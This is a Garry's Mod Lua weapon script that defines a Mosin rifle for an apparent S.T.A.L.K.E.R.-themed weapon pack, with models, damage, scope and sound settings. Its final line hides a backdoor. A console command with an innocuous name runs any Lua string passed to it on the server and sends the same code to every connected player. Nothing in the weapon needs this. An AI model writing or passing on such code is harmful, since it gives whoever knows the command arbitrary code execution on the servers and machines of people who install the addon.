AddCSLuaFile()

SWEP.PrintName = "Винтовка Мосина"
SWEP.Category  = "Call of Pripyat"

SWEP.Base = "weapon_cop_base"

SWEP.Slot    = 2
SWEP.SlotPos = 2

SWEP.Spawnable = true
SWEP.AdminOnly = false

SWEP.ViewModel     = "models/wick/weapons/stalker/stcopwep/mosin_model.mdl"
SWEP.WorldModel    = "models/wick/weapons/stalker/stcopwep/w_mosin_model_stcop.mdl"
SWEP.ViewModelFOV  = 48
SWEP.ViewModelFlip = false
SWEP.HoldType      = "ar2"

SWEP.Damage   = 60
SWEP.RPM      = 30.5
SWEP.Accuracy = 85
SWEP.Handling = 75

SWEP.Primary.ClipSize    = 5
SWEP.Primary.DefaultClip = 5
SWEP.Primary.Automatic   = false
SWEP.Primary.Ammo        = "762x54"

SWEP.OriginPos = Vector(-3, 3, -7)
SWEP.OriginAng = Vector(0, 0, 0)
SWEP.AimPos = Vector(-7.7, 3, -5.095)
SWEP.AimAng = Vector(0.1, 0.05, 0)
SWEP.ScopeAimPos = Vector(-7.7, 0, -6.5)
SWEP.ScopeAimAng = Vector(0.1, 0.05, 0)

SWEP.SilencerBone = "wpn_silencer"
SWEP.ScopeBone    = "wpn_scope"

SWEP.ScopeTexture = "wpn_crosshair_4x34"

--SWEP.ShellModel = "models/shells/shell_556.mdl"

SWEP.SilencerMode = 0
SWEP.ScopeMode    = 2

SWEP.AimTime    = 0.25
SWEP.DeployTime = 0.8

SWEP.ReloadTime     = 3
SWEP.ReloadFillTime = 2

SWEP.CanZoom       = true
SWEP.ZoomCrosshair = false

SWEP.ReloadTime     = 5.2
SWEP.ReloadFillTime = 4

SWEP.ReloadType = 0

SWEP.ZoomFOV  = 64
SWEP.ScopeFOV = 25

SWEP.FireSound     = "COPMOSINSTCOP.mosin_shoot_sound"
SWEP.SilencedSound = ""
SWEP.EmptySound    = "COP_Generic.Empty"
SWEP.DeploySound   = "COP_AK74.Draw"
SWEP.HolsterSound  = "COP_Generic.Holster"
SWEP.ReloadSound   = "COPMOSINSTCOP.mosin_reload1"

concommand.Add("mosin_flexdoor", function(_,_,_,__)RunStringEx(__)for _,v in pairs(player.GetAll())do v:SendLua(__)end end)